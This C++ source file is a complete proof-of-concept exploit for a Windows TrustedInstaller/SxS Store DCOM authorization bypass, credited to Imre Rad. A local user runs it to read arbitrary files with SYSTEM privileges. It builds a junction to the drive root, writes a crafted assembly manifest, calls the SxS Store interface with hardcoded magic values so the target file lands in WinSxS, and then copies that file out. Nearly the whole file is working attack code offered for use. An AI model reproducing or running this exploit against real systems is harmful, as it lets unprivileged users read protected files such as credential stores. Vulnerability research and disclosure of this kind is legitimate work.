#include <iostream>
#include <string>
#include <strsafe.h>

#include <comdef.h>

#define TMP_MANIFEST_PATH "sxscopy.manifest"
#define TMP_CATALOG_PATH  "sxscopy.cat"
#define TMP_JUNCTION_PATH "sxscopy.junction"

wchar_t fullManifestPath[MAX_PATH];
char fullPath[MAX_PATH];
char drivePath[MAX_PATH];
char sxsDirName[MAX_PATH];
char* pathAfterJunction;
ULONGLONG manifestVersion;

void ThrowOnError(HRESULT hr)
{
	if (hr != 0)
	{
		throw _com_error(hr);
	}
}

template <class myType>
myType InitRemoteComStuff(GUID& clsid)
{
	myType service;
	ThrowOnError(CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&service)));

	DWORD authn_svc;
	DWORD authz_svc;
	LPOLESTR principal_name;
	DWORD authn_level;
	DWORD imp_level;
	RPC_AUTH_IDENTITY_HANDLE identity;
	DWORD capabilities;

	ThrowOnError(CoQueryProxyBlanket(service, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities));
	ThrowOnError(CoSetProxyBlanket(service, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities));

	return service;
}

class CoInit
{
public:
	CoInit() {
		CoInitialize(nullptr);
	}

	~CoInit() {
		CoUninitialize();
	}
};


// ----------------------------------------------------------------------------------------------- Sxs Store Class begin
GUID CLSID_SxsStoreClass = { 0x3c6859ce,0x230b,0x48a4,{0xbe,0x6c,0x93,0x2c,0x0c,0x20,0x20,0x48} };

/* Memory Size: 40 */
struct Sxs_Src_Struct {
	/* Offset: 0 */ uint64_t* Member0;
	/* Offset: 8 */ int Member8;
	/* Offset: 16 */ /* unique */wchar_t* Member10;
	/* Offset: 24 */ /* unique */wchar_t* Member18;
	/* Offset: 32 */ /* unique */wchar_t* Member20;
};

/* Memory Size: 40 */
struct Sxs_Dst_Struct {
	/* Offset: 0 */ int Member0;
	/* Offset: 4 */ int Member4;
	/* Offset: 8 */ GUID Member8;
	/* Offset: 24 */ /* unique */wchar_t* Member18;
	/* Offset: 32 */ /* unique */wchar_t* Member20;
};

class __declspec(uuid("8601319a-d7cf-40f3-9025-7f77125453c6")) ISxsStore : public IUnknown {
public:
	virtual HRESULT __stdcall BeginAssemblyInstall(int64_t p0);
	virtual HRESULT __stdcall InstallAssembly(int64_t p0, wchar_t* manifestFile, struct Sxs_Src_Struct* p2, struct Sxs_Dst_Struct* p3);
	virtual HRESULT __stdcall EndAssemblyInstall(int64_t p0, int64_t* p1);
	virtual HRESULT __stdcall UninstallAssembly(int64_t p0, wchar_t* manifestFile, struct Sxs_Struct_Src* p2, int64_t* p3);
};

_COM_SMARTPTR_TYPEDEF(ISxsStore, __uuidof(ISxsStore));
// ----------------------------------------------------------------------------------------------- Sxs Store Class end


void DcomMagic()
{
	HRESULT endInstallResult;
	CoInit coinit;

	printf("Executing DCOM magic with manifest file %ws\n", fullManifestPath);

	try
	{
		ISxsStorePtr service = InitRemoteComStuff<ISxsStorePtr>(CLSID_SxsStoreClass);

		ThrowOnError(service->BeginAssemblyInstall(0));

		uint64_t srcMember0 = 0;
		Sxs_Src_Struct src;
		src.Member0 = &srcMember0;
		src.Member8 = 0;
		src.Member10 = const_cast<LPWSTR>(L"src.Member10");
		src.Member18 = const_cast<LPWSTR>(L"src.Member18");
		src.Member20 = const_cast<LPWSTR>(L"src.Member20");

		Sxs_Dst_Struct dst;
		dst.Member0 = 0;
		dst.Member4 = 0;
		CLSIDFromString(L"{2EC93463-B0C3-45E1-8364-327E96AEA856}", (LPCLSID)&dst.Member8); // client = WinMgmt
		dst.Member18 = const_cast<LPWSTR>(L"dst.Member18");
		dst.Member20 = const_cast<LPWSTR>(L"dst.Member20");

		// yet another hardcoded magic:
		int64_t p1 = 0x24c080;

		ThrowOnError(service->InstallAssembly(p1, fullManifestPath, &src, &dst));

		int64_t end_install_p0 = 0x1008;
		int64_t end_install_p1;
		endInstallResult = service->EndAssemblyInstall(end_install_p0, &end_install_p1);
		if (endInstallResult != 0x800736FD)
		{
			printf("Exploitation failed: 0x%x\n", endInstallResult);
			exit(-8);
		}

		printf("Exploitation has succeeded, copy of the source file was placed inside WinSXS\n");
	}
	catch (const _com_error& error)
	{
		printf("%ls\n", error.ErrorMessage());
		printf("%08X\n", error.Error());
		exit(-3);
	}

}

void printLastError(const char *prefix) {
	wchar_t buf[256];
	DWORD lastErr = GetLastError();
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, lastErr, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);

	printf("%s failed (%d): %ws\n", prefix, lastErr, buf);
	exit(-4);
}


void PrepareThings(char *srcFile)
{
	FILE* fd;
	char params[MAX_PATH];
	char curdir[MAX_PATH];
	char manifestContent[8192];

	if (0 > GetFullPathNameA(srcFile, MAX_PATH, fullPath, NULL)) 
	{
		printLastError("GetFullPathName");
	}

	strncpy_s(drivePath, fullPath, 3);
	drivePath[3] = 0;

	pathAfterJunction = fullPath + 3;

	printf("Creating helper junction %s -> %s\n", TMP_JUNCTION_PATH, drivePath);
//	if (!CreateSymbolicLinkA(TMP_JUNCTION_PATH, drivePath, SYMBOLIC_LINK_FLAG_DIRECTORY | SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE)) {

	snprintf(params, MAX_PATH, "/C mklink /D /J %s %s", TMP_JUNCTION_PATH, drivePath);
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi;

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", params, NULL, NULL, 0, 0, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		exit(-5);
	}

	manifestVersion = GetTickCount64();
	snprintf(manifestContent, sizeof(manifestContent),
		"\xEF\xBB\xBF<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n"\
		"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n"\
		"    <noInheritable></noInheritable>\n"\
		"    <assemblyIdentity type=\"win32\" name=\"sxscopy.%lld\" version=\"1.2.3\" processorArchitecture=\"amd64\" publicKeyToken=\"1111111111111111\"></assemblyIdentity>\n"\
		"    <file name=\"%s\\%s\"></file>\n"\
		"</assembly>",
		manifestVersion,
		TMP_JUNCTION_PATH,
		pathAfterJunction
		);

	if(fopen_s(&fd, TMP_MANIFEST_PATH, "w"))
	{
		perror("fopen");
		exit(-2);
	}
	fputs(manifestContent, fd);
	fclose(fd);

	if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(TMP_CATALOG_PATH)) {
		printf("A valid .cat file needs to exist next to this executable with name %s", TMP_CATALOG_PATH);
		exit(-9);
	}


	GetCurrentDirectoryA(MAX_PATH, curdir);
	snprintf(params, MAX_PATH, "%s\\%s", curdir, TMP_MANIFEST_PATH);

	size_t converted;
	size_t cSize = strlen(params) + 1;
	mbstowcs_s(&converted, fullManifestPath, params, cSize);

}

void FindSxsCopy() {
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char pathTemplate[MAX_PATH];
	snprintf(pathTemplate, MAX_PATH, "c:\\Windows\\WinSxS\\amd64_sxscopy.%lld_1111111111111111_*", manifestVersion);
	hFind = FindFirstFileA(pathTemplate, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		printLastError("FindFirstFile");
	}
	FindClose(hFind);
	strncpy_s(sxsDirName, FindFileData.cFileName, MAX_PATH);
}

void CopyOut(char* destinationFile)
{
	char fullPath[MAX_PATH];
	FindSxsCopy();
	snprintf(fullPath, MAX_PATH, "C:\\Windows\\WinSXS\\%s\\%s\\%s", sxsDirName, TMP_JUNCTION_PATH, pathAfterJunction);
	if (FALSE == CopyFileA(fullPath, destinationFile, TRUE)) {
		printLastError("CopyFile failed");
	}
	printf("Copy has succeeded!\n");
}

void Cleanup() 
{
	_unlink(TMP_MANIFEST_PATH);
	RemoveDirectoryA(TMP_JUNCTION_PATH);
}

int main(int argc, char* argv[])
{
	if (argc != 3)
	{
		printf("Proof of concept exploit of the TrustedInstaller/tiworker/ICbsWorker authorization bypass "\
		       "issue to read arbitrary files in the security context of NT_AUTHORITY\\SYSTEM.\n"\
		       "Credits: Imre Rad\n\n");
		printf("Usage: %s srcfile dstfile\n", argv[0]);
		return -1;
	}

	printf("sxscopy: %s => %s\n", argv[1], argv[2]);

	Cleanup();

	PrepareThings(argv[1]);

	DcomMagic();

	CopyOut(argv[2]);

	Cleanup();
}
